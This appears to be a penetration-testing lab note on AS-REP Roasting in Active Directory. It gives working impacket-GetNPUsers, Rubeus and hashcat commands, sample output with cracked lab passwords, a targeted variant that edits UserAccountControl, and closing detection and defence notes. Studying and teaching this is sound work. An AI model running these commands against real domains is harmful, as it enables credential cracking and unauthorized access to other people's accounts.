## Overview

**AS-REP Roasting** is an Active Directory password attack against users that do **not require Kerberos pre-authentication**.

If Kerberos pre-authentication is disabled for a user, an attacker can request an AS-REP response for that user and perform an offline password cracking attack against the encrypted part of the response.

The attack targets this account setting:

```text
Do not require Kerberos preauthentication
```

If enabled, the account may be vulnerable to AS-REP Roasting.

---

# Kerberos Authentication Refresher

Normal Kerberos authentication begins with an:

```text
AS-REQ
```

The client sends an authentication request to the domain controller.

If Kerberos pre-authentication is required, the client must prove knowledge of the user’s password-derived key before the domain controller returns useful ticket data.

If authentication succeeds, the domain controller responds with:

```text
AS-REP
```

The AS-REP contains:

```text
session key
Ticket Granting Ticket
```

---

# Why Pre-Authentication Matters

Kerberos pre-authentication prevents offline password guessing.

With pre-authentication enabled:

```text
client must prove it knows the password-derived key first
domain controller does not blindly return crackable data
```

Without pre-authentication:

```text
attacker can request AS-REP for a user
domain controller returns encrypted data
attacker cracks the AS-REP hash offline
```

This is the basis of AS-REP Roasting.

> [!important]
> AS-REP Roasting does not require knowing the target user’s password. It only requires the account to have Kerberos pre-authentication disabled.

---

# When AS-REP Roasting Works

AS-REP Roasting works when a user account has this option enabled:

```text
Do not require Kerberos preauthentication
```

By default, this option is disabled.

However, it may be enabled because:

```text
legacy applications require it
old integrations depend on it
administrators misconfigured the account
compatibility workarounds were applied
security hardening was incomplete
```

---

# Attack Flow

```text
1. Identify users without Kerberos pre-authentication.
2. Request AS-REP data for vulnerable users.
3. Save the AS-REP hash.
4. Crack the hash offline with Hashcat.
5. Use recovered credentials for further enumeration or access.
```

Diagram:

```text
Attacker
  |
  | AS-REQ for vulnerable user
  v
Domain Controller
  |
  | AS-REP returned without pre-auth proof
  v
Attacker
  |
  | offline cracking
  v
Recovered password
```

# Kali Method – impacket-GetNPUsers

## Tool

Use:

```text
impacket-GetNPUsers
```

Purpose:

```text
Identify users with Kerberos pre-authentication disabled.
Request AS-REP hashes.
Save hashes in Hashcat-compatible format.
```

---

## Authenticated AS-REP Roasting

Example known credential:

```text
corp.com/pete
Password: Nexus123!
```

Command:

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/pete
```

Options:

| Option | Meaning |
|---|---|
| `-dc-ip 192.168.50.70` | Domain controller IP |
| `-request` | Request AS-REP hashes |
| `-outputfile hashes.asreproast` | Save hashes to file |
| `corp.com/pete` | Domain and authenticating user |

When prompted, enter:

```text
Nexus123!
```

---

## Example Output

```text
Name  MemberOf  PasswordLastSet             LastLogon                   UAC
----  --------  --------------------------  --------------------------  --------
dave            2022-09-02 19:21:17.285464  2022-09-07 12:45:15.559299  0x410200
```

Interpretation:

```text
dave has Kerberos pre-authentication disabled.
dave is vulnerable to AS-REP Roasting.
An AS-REP hash was written to hashes.asreproast.
```

# Identify Vulnerable Users Only

To identify vulnerable users without requesting hashes or writing output:

```bash
impacket-GetNPUsers -dc-ip 192.168.50.70 corp.com/pete
```

This can help confirm whether any users are vulnerable before running the full request workflow.

# Hashcat Mode

AS-REP hashes use Hashcat mode:

```text
18200
```

Check with:

```bash
hashcat --help | grep -i "Kerberos"
```

Relevant output:

```text
18200 | Kerberos 5, etype 23, AS-REP | Network Protocol
```

---

# Crack AS-REP Hash with Hashcat

Command:

```bash
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

Options:

| Option | Meaning |
|---|---|
| `-m 18200` | AS-REP hash mode |
| `hashes.asreproast` | Hash file |
| `rockyou.txt` | Wordlist |
| `-r best64.rule` | Rule file |
| `--force` | Force Hashcat execution in lab VM |

Example cracked result:

```text
dave:Flowers1
```

Finding:

```text
User: dave
Password: Flowers1
```

> [!tip]
> If Hashcat reports not enough allocatable device memory, increase VM RAM. Around 4 GB is enough for the lab examples.

---

## Run AS-REP Roast with Rubeus

```powershell
.\Rubeus.exe asreproast /nowrap
```

Options:

| Option | Meaning |
|---|---|
| `asreproast` | Search for users without pre-auth and request AS-REP hash |
| `/nowrap` | Prevent line wrapping in output hash |

Why `/nowrap` matters:

```text
Hashcat needs the hash in one clean line.
Wrapped hashes can fail to crack unless cleaned up.
```

# UserAccountControl Flag

Rubeus searches LDAP for users with this UserAccountControl flag:

```text
4194304
```

LDAP matching rule from Rubeus output:

```text
userAccountControl:1.2.840.113556.1.4.803:=4194304
```

Meaning:

```text
Do not require Kerberos preauthentication
```

This is the flag that makes the account AS-REP roastable.

# Targeted AS-REP Roasting

## Concept

If no users have pre-authentication disabled, but you have dangerous permissions over another user, you may be able to make that user AS-REP roastable.

Relevant permissions:

```text
GenericWrite
GenericAll
```

Possible approach:

```text
1. Modify the target user's UserAccountControl value.
2. Enable Do not require Kerberos preauthentication.
3. Request AS-REP hash.
4. Crack hash offline.
5. Restore the original UserAccountControl value.
```

This is known as:

```text
Targeted AS-REP Roasting
```

> [!warning]
> Always restore the original UserAccountControl value after testing. This is a detectable and risky change in real environments.

---

## Why Targeted AS-REP Roasting May Be Preferred Over Password Reset

If you have control over a user object, you may be able to:

```text
reset the user's password
```

But this can:

```text
lock the user out
disrupt business operations
create obvious alerts
change the account state
```

Targeted AS-REP Roasting may allow hash capture without immediately changing the user's password.

However, it still modifies AD account settings and should be treated as sensitive.

# Common Findings and Interpretation

| Finding | Meaning |
|---|---|
| `Do not require Kerberos preauthentication` enabled | User may be AS-REP roastable |
| `GetNPUsers` lists a user | User is vulnerable |
| AS-REP hash saved | Offline cracking can begin |
| Hashcat mode `18200` | Correct mode for Kerberos AS-REP etype 23 |
| Rubeus `AS-REQ w/o preauth successful` | AS-REP roast succeeded |
| Cracked password | Valid credential if still current |
| No vulnerable users | Try PowerView checks or assess targeted AS-REP possibility |
| GenericWrite/GenericAll over user | May allow targeted AS-REP Roasting |

# Troubleshooting

## GetNPUsers Finds No Users

Possible reasons:

```text
no users have pre-authentication disabled
wrong domain
wrong DC IP
bad credentials
network cannot reach DC
LDAP/Kerberos blocked
```

Try:

```powershell
Get-DomainUser -PreauthNotRequired
```

---

## Hashcat Does Not Crack the Hash

Possible reasons:

```text
password not in wordlist
rule set not sufficient
hash format copied incorrectly
line wrapping broke the hash
wrong Hashcat mode
insufficient VM memory
```

Check:

```text
mode is 18200
hash is one line
hash begins with $krb5asrep$
```

---

## Rubeus Hash Has Line Breaks

Use:

```powershell
/nowrap
```

Then copy the full hash as one line.

If Hashcat reports:


For the lab examples:

```text
4 GB RAM is sufficient
```

# Detection and Defensive Notes

## Detection Opportunities

AS-REP Roasting may generate:

```text
AS-REQ requests without pre-authentication
Kerberos events for accounts without pre-auth
unusual Kerberos activity from non-standard hosts
Rubeus execution
impacket-GetNPUsers activity
large numbers of AS-REQs
LDAP queries for pre-auth-not-required users
```

Potential indicators:

```text
many AS-REQs for different users
requests for users with DONT_REQ_PREAUTH
sudden enumeration of userAccountControl flags
Hashcat activity on attacker host is usually off-network
```

---

## Defensive Controls

Reduce AS-REP Roasting risk by:

```text
ensuring Kerberos pre-authentication is enabled for all users
monitoring accounts with Do not require Kerberos preauthentication
auditing UserAccountControl changes
monitoring for AS-REQ without pre-authentication
using strong passwords for all domain users
using long random passwords for service and legacy accounts
reviewing GenericWrite and GenericAll permissions over user objects
alerting on changes to pre-authentication settings
```

---

# Key Takeaways

- AS-REP Roasting targets users without Kerberos pre-authentication.
- The vulnerable setting is `Do not require Kerberos preauthentication`.
- By default, this setting is disabled.
- If enabled, an attacker can request an AS-REP hash for offline cracking.
- `impacket-GetNPUsers` can perform AS-REP Roasting from Kali.
- `Rubeus asreproast` can perform AS-REP Roasting from Windows.
- Hashcat mode for AS-REP etype 23 is `18200`.
- `Get-DomainUser -PreauthNotRequired` identifies vulnerable users with PowerView.
- Rubeus uses an LDAP filter looking for UAC value `4194304`.
- If no accounts are vulnerable but you have `GenericWrite` or `GenericAll` over a user, targeted AS-REP Roasting may be possible.
- Restore modified account settings after targeted testing.
- Cracked credentials should trigger renewed enumeration from the new user context.
